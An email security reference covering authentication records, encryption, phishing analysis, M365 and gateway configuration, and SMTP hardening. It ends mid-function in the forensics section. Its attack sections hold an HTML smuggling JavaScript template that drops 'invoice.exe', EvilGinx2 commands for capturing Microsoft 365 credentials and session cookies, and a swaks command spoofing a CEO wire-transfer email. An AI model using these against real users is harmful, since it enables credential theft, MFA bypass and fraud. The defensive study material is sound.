# Email Security Reference

> **Scope**: Email authentication protocols (SPF/DKIM/DMARC), email encryption, phishing analysis, email-based attack techniques, Microsoft 365 Defender configuration, Email Security Gateway (SEG) configuration, SMTP protocol security, and email forensics.
> Mapped to MITRE ATT&CK T1566 (Phishing), T1566.001 (Spear Phishing Attachment), T1027.006 (HTML Smuggling), and NIST SP 800-177 (Trustworthy Email).

---

## Table of Contents

- [Email Authentication Protocols](#email-authentication-protocols)
- [Email Encryption](#email-encryption)
- [Phishing Analysis](#phishing-analysis)
- [Email-Based Attack Techniques](#email-based-attack-techniques)
- [Microsoft 365 Email Security Configuration](#microsoft-365-email-security-configuration)
- [Email Security Gateway (SEG) Configuration](#email-security-gateway-seg-configuration)
- [SMTP Protocol Security](#smtp-protocol-security)
- [Email Forensics](#email-forensics)
- [Email Security Standards Quick Reference](#email-security-standards-quick-reference)

---

## Email Authentication Protocols

### SPF (Sender Policy Framework)

- DNS TXT record listing authorized sending IPs for a domain
- Syntax:
  ```
  v=spf1 ip4:203.0.113.0/24 ip6:2001:db8::/32 include:_spf.google.com ~all
  ```
- Mechanisms: `ip4`, `ip6`, `a`, `mx`, `include`, `exists`, `redirect`
- Qualifiers: `+` (Pass), `-` (Fail), `~` (SoftFail), `?` (Neutral)
- **SPF limitations**:
  - 10 DNS lookup limit — exceeding causes `permerror`
  - Does not protect display name spoofing
  - Breaks with email forwarding (envelope `From` changes)
- **SPF alignment**: envelope `From` domain must match authenticated domain (required for DMARC pass)

**SPF Qualifier Reference**

| Qualifier | Name | Action if matched |
|-----------|------|-------------------|
| `+` | Pass | Accept the email |
| `-` | Fail | Reject the email |
| `~` | SoftFail | Accept but mark (spam folder) |
| `?` | Neutral | No policy — treat normally |

**SPF Mechanism Reference**

| Mechanism | Description |
|-----------|-------------|
| `ip4:x.x.x.x/n` | IPv4 address or CIDR |
| `ip6:x::x/n` | IPv6 address or CIDR |
| `a[:domain]` | A/AAAA record of domain matches |
| `mx[:domain]` | MX record IP matches |
| `include:domain` | Recursively check that domain's SPF |
| `exists:domain` | Custom macro-based check |
| `redirect=domain` | Substitute entire SPF record from this domain |
| `all` | Catch-all; always matches |

**SPF Troubleshooting**

```bash
# Check SPF record
dig TXT domain.com | grep spf

# Count DNS lookups (must be ≤ 10)
# Each include:, a:, mx:, exists:, redirect= counts as one lookup

# Common permerror causes:
# - Too many include: directives from third-party senders (GSuite, Salesforce, Mailchimp, Sendgrid)
# - Fix: use SPF flattening (replace includes with IPs) or subzone delegation
```

---

### DKIM (DomainKeys Identified Mail)

- Cryptographic signature added to email headers by the sending MTA
- DNS TXT record at `selector._domainkey.domain.com` contains the **public key**
- Receiving MTA uses public key to verify the signature in the `DKIM-Signature` header

**Signed headers (typical):** `From`, `To`, `Subject`, `Date`, `Message-ID`, `MIME-Version`

**Example DKIM DNS record:**
```
selector1._domainkey.example.com. IN TXT "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQ..."
```

**DKIM-Signature header in email:**
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com;
  s=selector1; h=from:to:subject:date:message-id;
  bh=BASE64_BODY_HASH; b=BASE64_SIGNATURE
```

**DKIM tag reference:**

| Tag | Description |
|-----|-------------|
| `v=` | Version (always `DKIM1`) |
| `a=` | Signing algorithm (`rsa-sha256` recommended) |
| `c=` | Canonicalization: `relaxed/relaxed` or `simple/simple` |
| `d=` | Signing domain |
| `s=` | Selector (points to DNS record) |
| `h=` | Headers included in signature |
| `bh=` | Body hash (base64) |
| `b=` | Signature (base64) |

**Canonicalization:**
- `relaxed/relaxed`: normalizes whitespace in headers and body — recommended for forwarding tolerance
- `simple/simple`: strict — any whitespace change breaks signature

**DKIM key generation:**
```bash
# Generate RSA-2048 private key
openssl genrsa -out dkim_private.pem 2048

# Extract public key
openssl rsa -in dkim_private.pem -pubout -out dkim_public.pem

# Format for DNS TXT record (strip header/footer, join into one line)
openssl rsa -in dkim_private.pem -pubout -outform DER | openssl base64 -A
```

**DKIM key rotation:**
- Rotate every 6–12 months
- Create new selector with new keypair, update MTA config
- Keep old selector valid for 30–60 days (in-flight emails still reference it)
- Then remove old selector from DNS

**DKIM weaknesses:**
- **DKIM replay attack**: valid DKIM signature can be reused by copying the email to new recipients — DMARC mitigates by checking `From` domain alignment
- **DKIM body length (`l=`) tag**: allows partial body signing — avoid; attackers can append malicious content
- Signing algorithm `rsa-sha1` is deprecated — require `rsa-sha256` or `ed25519-sha256`

---

### DMARC (Domain-based Message Authentication Reporting and Conformance)

- Policy: tells receiving mail servers what to do when SPF/DKIM alignment fails
- DNS TXT record at `_dmarc.domain.com`

**Full example DMARC record:**
```
v=DMARC1; p=reject; rua=mailto:dmarc-reports@domain.com; ruf=mailto:forensics@domain.com; sp=reject; adkim=s; aspf=s; pct=100; fo=1
```

**DMARC tag reference:**

| Tag | Values | Description |
|-----|--------|-------------|
| `v=` | `DMARC1` | Version |
| `p=` | `none`, `quarantine`, `reject` | Domain policy |
| `sp=` | `none`, `quarantine`, `reject` | Subdomain policy (defaults to `p=`) |
| `rua=` | `mailto:addr` | Aggregate report destination |
| `ruf=` | `mailto:addr` | Forensic report destination |
| `adkim=` | `s` (strict), `r` (relaxed) | DKIM alignment mode |
| `aspf=` | `s` (strict), `r` (relaxed) | SPF alignment mode |
| `pct=` | 1–100 | Percentage of mail to apply policy to |
| `fo=` | `0`,`1`,`d`,`s` | Forensic report generation options |

**Policy values:**
- `none`: monitor only — no rejection; aggregate reports sent; use to audit before enforcing
- `quarantine`: deliver to spam/junk folder
- `reject`: do not deliver — bounce

**DMARC alignment:**
- **SPF alignment**: envelope `From` (MAIL FROM) domain must match `From:` header domain
  - Strict (`aspf=s`): exact match
  - Relaxed (`aspf=r`): organizational domain match (e.g., `mail.example.com` aligns with `example.com`)
- **DKIM alignment**: `d=` tag in DKIM-Signature must align with `From:` header domain

**DMARC deployment progression (recommended):**
```
Phase 1: p=none  rua=mailto:reports@domain.com          # Observe, gather data (2–4 weeks)
Phase 2: p=quarantine  pct=10                            # Start quarantining 10% (1–2 weeks)
Phase 3: p=quarantine  pct=100                           # Quarantine all (1–2 weeks)
Phase 4: p=reject  pct=100                               # Full enforcement
```

**DMARC report parsing:**
```bash
# Install parsedmarc
pip install parsedmarc

# Parse a compressed aggregate report
parsedmarc -c parsedmarc.ini aggregate_report.xml.gz

# parsedmarc.ini example:
# [general]
# output = /tmp/dmarc_output
# [elasticsearch]
# hosts = localhost:9200
```

**DMARC aggregate report (XML) — key fields:**
- `<source_ip>`: sending IP
- `<count>`: number of messages
- `<policy_evaluated>`: DMARC pass/fail
- `<spf>`: SPF result
- `<dkim>`: DKIM result

**DMARC gaps (what it does NOT protect):**
- **Display name spoofing**: `From: "CEO Name" <attacker@evil.com>` — DMARC passes if evil.com has valid DMARC
- **Cousin domains**: `d0main.com` (zero instead of O), `domain.co` instead of `domain.com`
- **Unicode homoglyph attacks**: Cyrillic characters that look like Latin letters
- **Subdomain attacks**: if `sp=` is not set, subdomain policy defaults to `p=` value
- **Forwarding**: SPF often fails through mailing lists; DKIM is more robust here

**BIMI (Brand Indicators for Message Identification):**
- Display brand logo in inbox for participating mail clients (Gmail, Yahoo, Outlook)
- Requirements: DMARC `p=reject` or `p=quarantine` + Verified Mark Certificate (VMC) from DigiCert or Entrust
- DNS TXT record: `default._bimi.domain.com IN TXT "v=BIMI1; l=https://domain.com/logo.svg; a=https://domain.com/vmc.pem"`

---

### ARC (Authenticated Received Chain)

- Preserves authentication results across email forwarding and mailing lists
- Three ARC headers added by each intermediary:
  - `ARC-Authentication-Results`: records SPF/DKIM/DMARC at each hop
  - `ARC-Message-Signature`: DKIM-like signature of the message at this hop
  - `ARC-Seal`: chains the ARC sets together
- Receivers can use ARC to honor authentication from trusted forwarders even if SPF/DKIM fail after forwarding

---

## Email Encryption

### S/MIME (Secure/Multipurpose Internet Mail Extensions)

- X.509 certificate-based **signing** and **encryption**
- Requires per-user certificate issued by a CA (e.g., Sectigo Personal Email, GlobalSign, internal PKI via ADCS)

**Two distinct operations:**

| Operation | What it does | Certificate required |
|-----------|--------------|----------------------|
| **Signing** | Proves sender identity; detects tampering | Sender's private key (signing cert) |
| **Encryption** | Encrypts body to recipient | Recipient's **public key** must be obtained in advance |

**Key exchange challenge:** Encryption requires sender to have recipient's cert in advance — often exchanged via a signed email first, or through a certificate directory (LDAP/GAL).

**Client support:**
- Outlook (Windows, Mac): native support
- Apple Mail: native support
- Thunderbird: via Enigmail or native (Thunderbird 78+)
- Gmail: G Suite/Workspace only (S/MIME must be enabled by admin)

**Enterprise deployment:**
- GPO: push user certificates from internal CA to certificate store
- MDM (Intune, Jamf): deploy S/MIME certificates to mobile devices
- Auto-enrollment via ADCS + Group Policy for domain users

**S/MIME common pitfalls:**
- Certificate expiry breaks decryption of archived encrypted email if private key not backed up
- Encrypted email cannot be scanned by SEG/DLP — some organizations block S/MIME encryption
- Certificate revocation (CRL/OCSP) must be reachable; stale CRL causes validation failures

---

### PGP/GPG (Pretty Good Privacy / GNU Privacy Guard)

- **Web of Trust model** (vs. PKI hierarchy in S/MIME)
- No central CA required — trust established through direct key signing or key signing parties
- OpenPGP standard: RFC 4880

**Key management commands:**
```bash
# Generate key pair (interactive)
gpg --full-gen-key

# List public keys
gpg --list-keys

# List private keys
gpg --list-secret-keys

# Export public key (ASCII armored)
gpg --export --armor user@example.com > pubkey.asc

# Import a public key
gpg --import pubkey.asc

# Sign and encrypt message
gpg --sign --encrypt -r recipient@example.com message.txt

# Decrypt and verify
gpg --decrypt message.txt.gpg

# Sign only (clearsign)
gpg --clearsign document.txt

# Verify signature
gpg --verify document.txt.asc
```

**Key servers:**
```bash
# Upload public key
gpg --keyserver keys.openpgp.org --send-keys KEYID

# Search for key
gpg --keyserver keys.openpgp.org --search-keys user@example.com

# Fetch by fingerprint
gpg --keyserver hkps://keys.openpgp.org --recv-keys FINGERPRINT
```

**Key fingerprint best practice:**
- Always verify fingerprint out-of-band (phone, in-person, official website)
- Never trust a public key server key without independent fingerprint verification
- Example: `gpg --fingerprint user@example.com`

**Proton Mail:**
- Uses PGP internally; keys are managed server-side per user
- End-to-end encrypted between Proton Mail users automatically
- External PGP: recipients can import their PGP public key into Proton; Proton will encrypt to it
- Zero-access architecture: Proton cannot read user email

---

### MTA-STS (Mail Transfer Agent Strict Transport Security)

- Enforces TLS (and certificate validation) for SMTP connections to your domain
- Without MTA-STS: STARTTLS is opportunistic and subject to STARTTLS downgrade attacks

**How it works:**
1. Sending MTA fetches policy from `https://mta-sts.domain.com/.well-known/mta-sts.txt`
2. DNS TXT `_mta-sts.domain.com` signals the policy ID (invalidates cached policy when changed)
3. Sending MTA must use TLS with valid cert; if TLS fails, email is not delivered (in `enforce` mode)

**Policy file (`/.well-known/mta-sts.txt`):**
```
version: STSv1
mode: enforce
mx: mail.domain.com
mx: mail2.domain.com
max_age: 604800
```

**Mode values:**
- `testing`: violations reported but delivery not blocked
- `enforce`: TLS required; block delivery on failure
- `none`: disable policy

**DNS TXT record:**
```
_mta-sts.domain.com. IN TXT "v=STSv1; id=20240101000000Z"
```

**TLS-RPT (TLS Reporting):** Reports STARTTLS/MTA-STS failures to operators:
```
_smtp._tls.domain.com. IN TXT "v=TLSRPTv1; rua=mailto:tls-reports@domain.com"
```

---

### DANE (DNS-Based Authentication of Named Entities)

- Publishes TLS certificate fingerprint in DNS (TLSA record) — requires **DNSSEC**
- Pins the expected certificate without CA involvement — eliminates rogue CA risk

**TLSA record syntax:**
```
_25._tcp.mail.domain.com. IN TLSA <usage> <selector> <matching-type> <cert-hash>
```

**TLSA field values:**

| Field | Value | Meaning |
|-------|-------|---------|
| Usage | `0` | PKIX-TA: CA constraint |
| Usage | `1` | PKIX-EE: End-entity constraint |
| Usage | `2` | DANE-TA: Trust anchor (no PKIX) |
| Usage | `3` | DANE-EE: End-entity only (no PKIX) — most common for SMTP |
| Selector | `0` | Full certificate |
| Selector | `1` | SubjectPublicKeyInfo only |
| Matching | `0` | Full content (no hash) |
| Matching | `1` | SHA-256 hash |
| Matching | `2` | SHA-512 hash |

**Generating TLSA record:**
```bash
# Hash of certificate for DANE-EE (3 1 1)
openssl x509 -in cert.pem -noout -pubkey | \
  openssl pkey -pubin -outform DER | \
  openssl dgst -sha256 -hex | awk '{print $2}'
```

---

## Phishing Analysis

### Email Header Analysis

Headers to examine (read `Received:` chain bottom to top = actual delivery path):

| Header | Purpose | What to look for |
|--------|---------|-----------------|
| `Received:` | Delivery path | Count hops; first `Received` = originating server |
| `Return-Path:` | Bounce address | Different from `From:` is a red flag |
| `X-Originating-IP:` | Sender IP | Check against SPF, geolocation |
| `Authentication-Results:` | SPF/DKIM/DMARC | `spf=fail`, `dkim=fail`, `dmarc=fail` are red flags |
| `X-Spam-Status:` | Gateway verdict | Check score and rules triggered |
| `Message-ID:` | Unique ID | Domain should match sending server |
| `MIME-Version:` | MIME structure | Check for unusual multipart nesting |
| `X-Mailer:` / `User-Agent:` | Mail client | Inconsistent with claimed sender |

**Reading the `Received:` chain:**
```
Received: from evil-server.com (1.2.3.4) by mx.victim.com    ← hop 2 (read last = sender)
Received: from mail.evil.com (evil-server.com [1.2.3.4])      ← hop 1 (read first = final)
```
Read bottom-to-top: last `Received:` header = originating server.

---

### Phishing Indicator Checklist

```
[ ] From display name doesn't match From email address
[ ] Sending domain ≠ displayed domain (spoofed or lookalike)
[ ] SPF/DKIM/DMARC fail in Authentication-Results header
[ ] Unusual sending IP (check against domain's SPF record)
[ ] URL doesn't match displayed text (hover to see real URL)
[ ] URL uses URL shortener, redirector, or lookalike domain
[ ] Attachment: .docm, .xlsm, .iso, .img, .zip, .7z, .html (HTML smuggling)
[ ] Urgency language: "Immediate action required", "Account suspended"
[ ] Sender impersonating known brand or internal user
[ ] Email thread hijacking: replies inserted into existing legitimate thread
[ ] Mismatched reply-to address (replies go to attacker)
[ ] Time-sensitive requests: gift card, wire transfer, payroll change
[ ] Unexpected "password reset" or "MFA setup" link
[ ] Grammar/spelling inconsistencies inconsistent with sender's known communication
```

---

### URL Deobfuscation Techniques

```python
import urllib.parse, base64, re

# URL encoding decode
print(urllib.parse.unquote('hxxps%3A%2F%2Fevil.com%2Fpath'))
# → hxxps://evil.com/path

# Base64 decode
print(base64.b64decode('aHR0cHM6Ly9ldmlsLmNvbQ==').decode())
# → https://evil.com

# Defanging (safe sharing format used in threat intel):
# hxxps://evil[.]com/path → https://evil.com/path
def refang(url):
    url = url.replace('hxxps', 'https').replace('hxxp', 'http')
    url = url.replace('[.]', '.').replace('[:]', ':')
    url = url.replace('(:)', ':').replace('[dot]', '.')
    return url

# Double URL encoding
urllib.parse.unquote(urllib.parse.unquote('%2568%2574%2574%2570'))

# Unicode escape
print('https')  # → https

# Punycode / IDN domain (homoglyph)
import encodings.idna
# xn--pple-43d.com → аpple.com (Cyrillic а)
```

---

### Phishing Kit Analysis

**HTML source indicators:**
- Copied assets from legitimate site (CDN URLs, same CSS structure)
- POST action pointing to attacker-controlled endpoint (e.g., `action="https://evil.com/submit.php"`)
- JavaScript that redirects after credentials submitted
- Anti-analysis checks:
  - IP blocklist (sandbox/security vendor IPs get 404)
  - Referrer checks (must come from legitimate link)
  - User-agent restrictions (mobile-only, specific browsers)
  - Time-gated (only valid for 24 hours)

**OSINT on phishing domain:**
```bash
# WHOIS
whois phishing-domain.com

# DNS history
# https://securitytrails.com

# Passive DNS
# https://www.virustotal.com/gui/domain/phishing-domain.com/relations

# Screenshot / URL sandbox
# https://urlscan.io/search/#domain:phishing-domain.com
# https://app.any.run

# PhishTank lookup
# https://www.phishtank.com

# Shodan — check if IP hosts other phishing infra
shodan host 1.2.3.4
```

**Phishing infrastructure TTPs:**
- Domain registered within past 30 days
- Bulletproof hosting (AS numbers associated with abuse)
- Let's Encrypt certificate (free — common in phishing kits)
- Same IP hosting multiple lookalike domains
- Open directories exposing phishing kit `.zip` archives

---

## Email-Based Attack Techniques

### Spear Phishing (MITRE T1566.001)

- Targeted, researched emails to specific individuals or organizations
- **Reconnaissance sources**: LinkedIn (role, connections, direct reports), company website (org chart, press releases), social media, domain WHOIS, Hunter.io (email format), breach databases

**Common lure types:**

| Lure | Description |
|------|-------------|
| Fake invoice | Impersonates vendor with changed bank details |
| IT support ticket | "Your account will be disabled in 24 hours" |
| Shared document | OneDrive/SharePoint/DocuSign notification with phishing link |
| Payroll update | "Update your direct deposit details" |
| CEO request | Executive impersonation requesting urgent wire transfer |
| Job offer | Malicious attachment in "job offer" document |
| Package delivery | FedEx/UPS notification with malicious link |

**AiTM (Adversary-in-the-Middle) phishing:**
- Tools: **EvilGinx2**, **Modlishka**, **Muraena**
- Reverse proxy sits between victim and real site; captures session cookies after MFA
- Bypasses TOTP/push MFA — session token replayed to authenticate as victim
- **Defense:**
  - Azure Conditional Access with **Token Protection** (bind token to device)
  - **FIDO2 hardware keys** (phishing-resistant MFA — cryptographically bound to origin URL)
  - Continuous Access Evaluation (CAE)

---

### HTML Smuggling (MITRE T1027.006)

- Embeds malicious file as base64 inside HTML; assembled client-side in browser memory via JavaScript Blob API
- Bypasses email attachment scanning — the HTML attachment itself is not a recognized malicious file type

**Technique example:**
```html
<script>
  var b64 = "TVqQAAMAAAAEAAAA...";  // Base64-encoded PE or ZIP
  var bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  var blob = new Blob([bytes], {type: 'application/octet-stream'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'invoice.exe';
  document.body.appendChild(a);
  a.click();
</script>
```

**Variations:**
- SVG-based smuggling: malicious script inside `.svg` file (treated as image)
- ISO/IMG container: embed LNK → PowerShell in ISO file linked from HTML
- Nested archives: HTML → ZIP → password-protected ZIP → malware

**Detection:**
```
Alert: HTML attachment containing all of:
  - <script> tags
  - atob() or base64 decoding
  - Blob creation (new Blob)
  - URL.createObjectURL + download
  - File extension: .html, .htm, .shtml
```

---

### Business Email Compromise (BEC) (MITRE T1566)

**BEC categories:**

| Type | Description |
|------|-------------|
| CEO fraud | Impersonate executive to request urgent wire transfer |
| Invoice fraud | Compromise vendor email; modify banking details on invoices |
| Payroll diversion | Fake HR/payroll request to change direct deposit account |
| Gift card fraud | Urgency request for gift cards (hard to reverse) |
| Attorney impersonation | Fake legal counsel requesting confidential transaction |
| Data theft | Request W-2s, employee PII under pretext of audit |

**BEC detection signals:**
- New inbox rules created (forwarding/redirect) — exfiltrates email silently
- Login from unusual country/IP shortly before suspicious email
- Wire transfer or payment change request sent exclusively via email
- Email chain anomaly: reply thread that doesn't match original conversation
- Sender IP/domain inconsistent with previous emails from that contact

**PowerShell — audit suspicious forwarding rules (BEC indicator):**
```powershell
# Check all mailboxes for forwarding rules
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-InboxRule -Mailbox $_.PrimarySmtpAddress |
    Where-Object { $_.ForwardTo -or $_.RedirectTo -or $_.DeleteMessage -or $_.ForwardAsAttachmentTo }
} | Select-Object MailboxOwnerID, Name, ForwardTo, RedirectTo, DeleteMessage

# Check mailbox forwarding setting (not inbox rules)
Get-Mailbox -ResultSize Unlimited |
Where-Object { $_.ForwardingAddress -or $_.ForwardingSmtpAddress } |
Select-Object DisplayName, ForwardingAddress, ForwardingSmtpAddress
```

---

### Email Credential Harvesting

**Credential phishing page TTPs:**
- Cloned login pages: Microsoft 365, Gmail, VPN portals, Citrix, DocuSign
- URL structure: `login-microsoft365.com`, `secure-dropbox.net`, `mail.victim-corp.co`
- Transparent reverse proxy: user actually authenticates to real site — captures session

**EvilGinx2:**
```bash
# Start EvilGinx2
evilginx2 -p /usr/share/evilginx/phishlets/

# Set phishlet for Microsoft 365
phishlets hostname o365 attacker-proxy.com
phishlets enable o365

# Create lure (unique phishing URL per target)
lures create o365
lures get-url 0

# View captured credentials and tokens
sessions
sessions 1
```

**Captured data:**
- Username/password
- Session cookie (`ESTSAUTH`, `ESTSAUTHPERSISTENT` for Microsoft 365)
- Cookie replay bypasses MFA entirely

**Indicators of AiTM phishing:**
- Login from two geographic locations in short succession (legitimate login + attacker replay)
- Multiple sign-ins from same user in seconds
- Token theft followed by MFA registration (attacker registers their own MFA device)

---

## Microsoft 365 Email Security Configuration

### Exchange Online Protection (EOP) — Built-in for all M365 tenants

**Anti-spam:**
- **SCL (Spam Confidence Level)**: -1 (allow list) to 9 (high confidence spam)
- **BCL (Bulk Complaint Level)**: 0–9; bulk email threshold configurable
- `SCL >= 5` → Junk folder; `SCL = 9` → Spam quarantine

**Anti-malware:**
- Double-tap scanning engine
- Block common malware file types by default
- Zero-hour Auto Purge (ZAP) for malware

**Anti-phishing (EOP baseline):**
- Spoof intelligence: detects spoofed sender domains
- Composite Authentication (`compauth`): combination of SPF, DKIM, DMARC + Microsoft ML

---

### Microsoft Defender for Office 365 (MDO) Plan 1

**Safe Attachments:**
- Detonates unknown attachments in a sandbox (Azure Sandbox)
- Policies:
  - `Off`: no detonation (not recommended)
  - `Monitor`: deliver, detonate, report
  - `Block`: block suspicious attachments (delayed delivery)
  - `Dynamic Delivery`: deliver email body immediately; replace attachment with placeholder while scanning; reattach if clean

```powershell
# Check Safe Attachments policies
Get-SafeAttachmentPolicy | Select Name, Action, Enable

# Enable Safe Attachments for all
New-SafeAttachmentPolicy -Name "Block-Malware" -Action Block -Enable $true
New-SafeAttachmentRule -Name "Block-Malware-Rule" -SafeAttachmentPolicy "Block-Malware" -RecipientDomainIs "corp.com"
```

**Safe Links:**
- Rewrites URLs in email and Office documents
- Checks URL at time-of-click (detects late-stage malicious redirect)
- "Do not track user clicks" — disable this; tracking is needed for IR
- Block the following URLs: add custom block list

```powershell
# Check Safe Links policies
Get-SafeLinksPolicy | Select Name, EnableSafeLinksForEmail, TrackClicks

# Enable Safe Links
Set-SafeLinksPolicy -Identity "Default" -EnableSafeLinksForEmail $true -TrackClicks $true -DoNotTrackUserClicks $false
```

---

### Microsoft Defender for Office 365 (MDO) Plan 2

**Threat Explorer:**
- Hunt for malicious emails; filter by sender, subject, URL, file hash
- Actions: soft delete, hard delete, move to junk, trigger investigation
- Useful query: emails with `compauth=fail` + `SCL >= 5` delivered to inbox

**Attack Simulation Training:**
- Launch phishing simulations targeting users
- Simulation types: credential harvest, attachment, link in attachment, drive-by-URL, OAuth consent grant
- Auto-assign training to users who click

**Zero-hour Auto Purge (ZAP):**
- Retroactively removes emails already delivered to inbox
- Triggers when: email classified as spam/malware **after** delivery (reputation update lag)
- Works for Exchange Online; not for on-premise mailboxes

**Advanced Hunting (Microsoft 365 Defender):**
```kusto
// Find emails with failed DMARC that reached inbox
EmailEvents
| where AuthenticationDetails has "dmarc=fail"
| where DeliveryAction == "Delivered"
| project Timestamp, SenderFromAddress, RecipientEmailAddress, Subject, AuthenticationDetails
| order by Timestamp desc
```

---

### M365 Anti-Phishing Configuration Best Practices

```powershell
# Get current anti-phishing policy
Get-AntiPhishPolicy | Select Name, EnableMailboxIntelligence, EnableSpoofIntelligence, EnableTargetedUserProtection

# Enable impersonation protection for key executives
Set-AntiPhishPolicy -Identity "Office365 AntiPhish Default" `
  -EnableTargetedUserProtection $true `
  -TargetedUsersToProtect @("CEO@corp.com:CEO","CFO@corp.com:CFO","CISO@corp.com:CISO") `
  -TargetedUserProtectionAction Quarantine

# Enable targeted domain protection
Set-AntiPhishPolicy -Identity "Office365 AntiPhish Default" `
  -EnableTargetedDomainsProtection $true `
  -TargetedDomainsToProtect @("corp.com","subsidiary.com") `
  -TargetedDomainProtectionAction Quarantine

# Enable mailbox intelligence (ML-based impersonation detection)
Set-AntiPhishPolicy -Identity "Office365 AntiPhish Default" `
  -EnableMailboxIntelligence $true `
  -EnableMailboxIntelligenceProtection $true `
  -MailboxIntelligenceProtectionAction MoveToJmf

# Check for suspicious forwarding (BEC)
Get-InboxRule -Mailbox victim@corp.com | Where-Object { $_.ForwardTo -or $_.RedirectTo }

# Audit admin audit log for inbox rule creation
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "New-InboxRule","Set-InboxRule" -ResultSize 1000 |
  Select-Object CreationDate, UserIds, Operations, AuditData
```

---

## Email Security Gateway (SEG) Configuration

### Proofpoint TAP (Targeted Attack Protection)

**URL Defense:**
- Rewrites all URLs in inbound email to route through Proofpoint scanning
- Checks URL reputation at time of click
- URL format: `https://urldefense.proofpoint.com/v3/__https://original-url__;...`

**Attachment Defense:**
- Sandboxes unknown attachments (Type-0 payload analysis)
- Supported file types: Office, PDF, executables, archives, scripts

**Impostor Defense:**
- Display name spoofing detection
- Lookalike domain detection
- DMARC enforcement integration

**TRAP (Threat Response Auto-Pull):**
- Retroactively removes malicious emails from all inboxes after delivery
- Integrates with Proofpoint SIEM connector for automated response

**Proofpoint useful queries:**
```
# Search for specific sender in Message Trace
# Admin Console → Email Protection → Message Trace

# URL click tracking
# TAP Dashboard → Clicks → filter by user, URL, time
```

---

### Mimecast

- **Targeted Threat Protection (TTP):** URL scanning, attachment sandboxing, impersonation protection
- **Internal Email Protect:** scans emails between internal users (insider threat, compromised mailbox)
- **Secure Messaging:** portal-based encrypted email delivery for sensitive messages
- **Continuity:** MX failover — maintains email access during outages
- **DMARC Analyzer:** built-in DMARC aggregate report parsing and deployment guidance

**Mimecast DKIM/SPF auto-update:**
- Mimecast can auto-update SPF/DKIM records via API integration with DNS providers

---

### Cisco Secure Email (formerly ESA)

- **AMP (Advanced Malware Protection):** file reputation + sandboxing
- **Outbreak Filters:** proactive protection based on Talos threat intelligence
- **Graymail Management:** bulk mail classification and unsubscribe
- **Content Filters:** regex-based policy enforcement; block SSNs, credit cards in outbound

**Cisco ESA CLI examples:**
```bash
# Check quarantine
quarantineconfig

# View mail flow stats
rate

# Check anti-spam settings
antispamconfig

# Test outbound TLS
tlsverify destination-domain.com
```

---

## SMTP Protocol Security

### SMTP Command Reference

| Command | Description |
|---------|-------------|
| `EHLO hostname` | Extended HELO; lists server capabilities |
| `HELO hostname` | Basic greeting |
| `MAIL FROM:<addr>` | Specify envelope sender |
| `RCPT TO:<addr>` | Specify envelope recipient |
| `DATA` | Begin message body |
| `QUIT` | End session |
| `STARTTLS` | Upgrade to TLS |
| `AUTH` | Authenticate (SMTP AUTH) |
| `VRFY user` | Verify if user exists (should be disabled) |
| `EXPN list` | Expand mailing list (should be disabled) |

### Open Relay Testing

```bash
# Manual SMTP test for open relay
telnet mail.example.com 25
EHLO test.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<external-victim@gmail.com>
# Should receive: 550 5.7.1 Relaying not allowed

# swaks (Swiss Army Knife for SMTP)
# Install: apt-get install swaks

# Basic connectivity test
swaks --to user@corp.com --from test@test.com --server mail.corp.com

# Test open relay
swaks --to external@gmail.com --from spoof@corp.com --server mail.corp.com --timeout 30

# Test with TLS
swaks --to user@corp.com --server mail.corp.com --tls

# Test with SMTP AUTH
swaks --to user@corp.com --server mail.corp.com --auth LOGIN --auth-user user --auth-password pass

# Send with custom headers
swaks --to victim@corp.com --from ceo@corp.com --server mail.corp.com \
  --header "Subject: Urgent Wire Transfer" \
  --body "Please process immediately"
```

### SMTP Security Hardening

**Authentication:**
- Disable SMTP AUTH on port 25 (inbound MX) — only allow for port 587 (submission)
- Require TLS for SMTP AUTH: `smtpd_tls_auth_only = yes` (Postfix)
- Implement rate limiting on SMTP AUTH attempts

**Reconnaissance prevention:**
```bash
# Postfix — disable VRFY and EXPN
disable_vrfy_command = yes

# Sendmail — disable EXPN/VRFY in sendmail.mc
FEATURE(`noexpn')dnl
FEATURE(`novrfy')dnl
```

**TLS configuration (Postfix):**
```bash
# Enforce TLS 1.2+ only
smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
smtp_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1

# Strong cipher selection
smtpd_tls_ciphers = high
smtpd_tls_exclude_ciphers = aNULL, eNULL, EXPORT, DES, RC4, MD5, PSK, SRP, CAST, 3DES, IDEA

# Enable STARTTLS
smtpd_tls_security_level = may        # opportunistic (inbound)
smtp_tls_security_level = encrypt     # enforce TLS outbound
smtpd_tls_cert_file = /etc/ssl/certs/mail.pem
smtpd_tls_key_file = /etc/ssl/private/mail.key
```

**HELO/EHLO validation:**
```bash
# Reject invalid HELO hostnames
smtpd_helo_required = yes
smtpd_helo_restrictions =
    permit_mynetworks,
    reject_non_fqdn_helo_hostname,
    reject_invalid_helo_hostname,
    permit
```

**Outbound DKIM signing (Postfix + OpenDKIM):**
```bash
# /etc/opendkim.conf
Domain                  example.com
KeyFile                 /etc/opendkim/keys/example.com/selector1.private
Selector                selector1
Socket                  inet:12301@localhost

# Postfix integration (main.cf)
milter_default_action = accept
milter_protocol = 2
smtpd_milters = inet:localhost:12301
non_smtpd_milters = inet:localhost:12301
```

---

## Email Forensics

### Header Parsing Tools

| Tool | Type | URL |
|------|------|-----|
| MXToolbox Header Analyzer | Web | https://mxtoolbox.com/EmailHeaders.aspx |
| Google Admin Toolbox | Web | https://toolbox.googleapps.com/apps/messageheader/ |
| MailHeader.org | Web | https://mailheader.org/ |
| emlAnalyzer | CLI | `pip install eml-analyzer` |
| mail-parser | Python lib | `pip install mail-parser` |
| Autopsy | Forensic platform | https://www.autopsy.com |

### Python Email Parsing

```python
import email
from email.header import decode_header
from email.utils import parseaddr
import re

def analyze_email(eml_path):
    with open(eml_path, 'rb') as f:
        msg = email.message_from_bytes(f.read())

    # Extract and decode headers
    def decode_hdr(value):
        if value is None:
            return None
        decoded = decode_header(value)
        return ''.join(
            part.decode(enc or 'utf-8') if isinstance(part, bytes) else part
            for part, enc in decoded
        )

